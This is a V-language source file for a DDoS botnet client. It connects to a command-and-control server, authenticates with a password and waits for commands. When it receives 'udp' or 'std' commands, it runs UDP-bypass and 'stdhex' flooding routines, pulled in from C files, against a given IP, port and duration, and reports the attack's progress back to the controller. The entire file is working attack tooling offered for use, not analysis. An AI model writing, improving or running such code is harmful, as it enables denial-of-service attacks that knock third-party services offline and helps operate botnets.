import os
import io
import net
import time

#include "@VROOT/core/methods/udp.c"
#include "@VROOT/core/methods/stdhex.c"

fn C.udp_bypass(&char, u16, int)
fn C.stdhex(&char, int, int)

fn main() {
	mut args := os.args.clone()
	if args.len < 4 {
		println("[x] Error, arguments provided!\n${args[0]} <ip> <port>")
		exit(0)
	}
	go server(args[1], args[2], args[3])
	for {

	}
}

fn server(ip string, port string, pw string) { 
	mut server := net.dial_tcp("${ip}:${port}") or {
		println("[x] Error, Unable to connect to the server....")
		exit(0)
	}

	mut reader := io.new_buffered_reader(reader: server)
	server.write_string("${pw}\n") or { 0 } // Send PW
	time.sleep(1*time.second)

	server.write_string("cpu_here\n") or { 0 } // Send CPU ARCH
	for {
		data := (reader.read_line() or { "" }).replace("\r\n", "")
		fcmd, cmd, args := parse_buffer(data)
		if data.len > 1 {
			match cmd {
				"udp" {
					if args.len < 4 {
						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
					} else {
						server.write_string("[ + ] Attack being sent....\n") or { 0 }
						C.udp_bypass(&char(args[1].str), args[2].u16(), args[3].int())
						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
					}
				}
				"std" {
					if args.len < 4 {
						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
					} else {
						server.write_string("[ + ] Attack being sent....\n") or { 0 }
						C.stdhex(&char(args[1].str), args[2].int(), args[3].int())
						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
					}
				} else {}
			}
			println("${data}")
		}
		
	}

}

fn parse_buffer(buff string) (string, string, []string) {
	mut args := []string{}
	mut cmd := ""
	if buff.contains(" ") {
		args = buff.split(" ")
		cmd = args[0]
	} else {
		args << buff
		cmd = buff
	}
	return buff, cmd, args
}